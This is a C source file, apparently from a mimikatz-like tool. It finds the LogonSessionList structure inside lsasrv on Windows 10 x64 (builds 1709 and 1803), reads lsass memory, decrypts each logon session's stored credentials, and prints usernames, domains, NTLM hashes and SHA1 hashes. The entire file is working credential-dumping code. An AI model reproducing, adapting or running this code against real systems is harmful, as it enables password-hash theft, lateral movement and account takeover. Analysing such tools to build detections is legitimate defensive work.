#include "stdafx.h"
#include "msv1_0.h"
#include "common.h"
#include "process.h"
#include "cng.h"

static IMAGE_PATTERN lsasrv_LogonSessList[] = {
	{ 0x000a00003fab0135, 0x3948088b48c10348, -4 }, //win10x64 1709
	{ 0x000a000042ee00fe, 0x3948088b48c10348, -4 }, //win10x64 1803
	{ 0, 0, 0 }
};

LPVOID Find_LogonSessList()
{
	/*LogonSessionList
	.text:000000018000790C 48 8D 0D DD 3E 16 00                          lea     rcx, ?LogonSessionList@@3PAU_LIST_ENTRY@@A ; _LIST_ENTRY near * LogonSessionList
	.text:0000000180007913 48 03 C1                                      add     rax, rcx
	.text:0000000180007916 48 8B 08                                      mov     rcx, [rax]
	.text:0000000180007919 48 39 41 08     cmp     [rcx+8], rax */
	LPVOID lpLogSessList = NULL;
	HMODULE hModule = LoadLibraryW(L"lsasrv");
	RETN_IF(hModule == NULL, L"LoadLibraryW", NULL);

	LPBYTE lpStart = (LPBYTE)hModule;
	LPBYTE lpEnd = (LPBYTE)GetProcAddress(hModule, "InitializeLsaExtension");
	GOTO_IF(lpEnd == NULL, L"GetProcAddress", cleanup);

	lpLogSessList = FindPatternFromModule(hModule, (PIMAGE_PATTERN)&lsasrv_LogonSessList, lpStart, lpEnd, 0);
cleanup:
	FreeLibrary(hModule);
	return lpLogSessList;
}

#define MAX_NAME 64
#define MAX_BUFF 1024

BOOL Msv1_0_LogonSessList_Dump()
{
	PMSV1_0_SESSION_ENTRY lpLogonSessionEntry = (PMSV1_0_SESSION_ENTRY) Find_LogonSessList();
	RETN_MSG_IF(lpLogonSessionEntry == NULL, FALSE, L"Cant find lsasrv!logonSessList\r\n");
	MESSAGE(L"lsasrv!logonSessList in lsass 0x%p\r\n", lpLogonSessionEntry);
	SIZE_T cbMemoryRead = 0;
	BOOL   bRet = FALSE;
	MSV1_0_SESSION_ENTRY szSessionEntry = { 0 };
	bRet = ReadLsassMemory(lpLogonSessionEntry, &szSessionEntry, sizeof(szSessionEntry));
	RETN_IF(!bRet, L"ReadProcessMemory", FALSE);

	TCHAR szUserName[MAX_NAME] = { 0 };
	TCHAR szDomain[MAX_NAME] = { 0 };
	TCHAR szLogonServer[MAX_NAME] = { 0 };
	MSV1_0_CREDENTIALS szCredentials = { 0 };
	MSV1_0_PRIMARY_CREDENTIALS szPrimaryCredentials = { 0 };
	BYTE szBuffer[1024] = { 0 };

	PMSV1_0_SESSION_ENTRY lpSessionEntry = &szSessionEntry;
	do
	{
		bRet = ReadLsassMemory(lpSessionEntry->Flink, &szSessionEntry, sizeof(szSessionEntry));
		RETN_IF(!bRet, L"ReadProcessMemory", FALSE);
		//MESSAGE(L"0x%p <- -> 0x%p\r\n", lpSessionEntry->Blink, lpSessionEntry->Flink);
		if (!ReadLsassLSAString(&lpSessionEntry->UserName, (LPBYTE)&szUserName))
			szUserName[0] = 0;
		if (!ReadLsassLSAString(&lpSessionEntry->Domain, (LPBYTE)&szDomain))
			szDomain[0] = 0;
		if (!ReadLsassLSAString(&lpSessionEntry->LogonServer, (LPBYTE)&szLogonServer))
			szLogonServer[0] = 0;
		MESSAGE(L"%s\\%s LogSrv:%s ", szUserName, szDomain, szLogonServer);
		if (lpSessionEntry->Credentials == NULL)
		{
			MESSAGE(L"NTLM: , SHA1: \r\n");
			continue;
		}
		bRet = ReadLsassMemory(lpSessionEntry->Credentials, &szCredentials, sizeof(szCredentials));
		bRet = ReadLsassMemory(szCredentials.PrimaryCredentials, &szPrimaryCredentials,
			sizeof(szPrimaryCredentials));
		ReadLsassLSAString(&szPrimaryCredentials.Credentials, (LPBYTE)&szBuffer);
		LsaEncryptMemory(szBuffer, szPrimaryCredentials.Credentials.Length, 0);
		//win10 x64适用于PMSV1_0_PRIMARY_CREDENTIAL_10_1607， 这里未像mimika一样进行不同操作系统适配
		PMSV1_0_PRIMARY_CREDENTIAL_10_1607 lpPrimaryCredential = (PMSV1_0_PRIMARY_CREDENTIAL_10_1607)&szBuffer;
		MESSAGE(L"NTLM: ");
		DigestDump((LPBYTE)& lpPrimaryCredential->NtOwfPassword, LM_NTLM_HASH_LENGTH);
		MESSAGE(L"\tSHA1: ");
		DigestDump((LPBYTE)& lpPrimaryCredential->ShaOwPassword, SHA_DIGEST_LENGTH);
		MESSAGE(L"\r\n");
	} while (lpSessionEntry->Flink != lpLogonSessionEntry);

	return TRUE;
}